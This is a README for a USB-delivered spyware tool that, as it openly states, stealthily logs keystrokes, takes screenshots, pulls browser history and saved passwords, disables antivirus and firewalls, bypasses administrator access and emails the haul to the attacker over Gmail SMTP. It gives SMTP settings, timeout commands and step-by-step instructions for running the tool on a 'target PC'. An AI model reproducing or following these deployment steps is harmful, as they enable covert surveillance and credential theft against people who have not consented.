Downloads the files and follow the step by step procedure!!!!!!

Open the script.bat file in a text editor and update it with your email and password where you want to receive the data. 
Set SMTP Configuration for Email Sending
:: Set SMTP configuration for email sending
set "smtp_server=smtp.gmail.com"
set "smtp_port=587"
set "smtp_user=your_email@gmail.com"
set "smtp_password=your_password"
set "recipient_email=recipient_email@gmail.com"

This tool is designed to stealthily capture and transmit sensitive user information, such as keystrokes, screenshots, browser history, and passwords, after a specified time, send the data to your Gmail account. 
You can change the time period for which you will receive data. By default, it is set to 30 minutes.
For 15 minutes:
timeout /t 900 /nobreak
For 1 hour:
timeout /t 3600 /nobreak
For 2 hours:
timeout /t 7200 /nobreak

Ensure that the timing and email configuration are correctly set up in the scrip

Copy files to a USB drive. Ensure all required files are included for the script to function correctly.

Insert the USB drive into the target PC.

Run the Script

In case the script.bat does not run automatically, manually double-click the file to execute it. After the initial run, it should work perfectly.
If autorun doesn't work, you can also run the autorun_enable file to bypass all administrator access and enable autorun.

Enjoy!!!!!!!!!

All-in-One Solution

The key functionalities of my project include:

1. Keylogging: Captures all keystrokes made by the user, providing a detailed log of their activities.
2. Screenshot Capture: Periodically takes screenshots of the user's screen to visually document their activities.
3. Browser History and Password Collection: Extracts browsing history and stored passwords from popular web browsers, giving a comprehensive view of the user's online behavior.
4. Disabling Antivirus and Firewalls: Identifies and disables active antivirus programs and firewalls to avoid detection and ensure uninterrupted operation.
5. Bypassing Administrator Access: Exploits vulnerabilities to gain elevated privileges, allowing the tool to operate with minimal restrictions.
6. Data Transmission via SMTP: Sends the collected data to a specified email address using SMTP, ensuring that the information is securely delivered to the attacker.
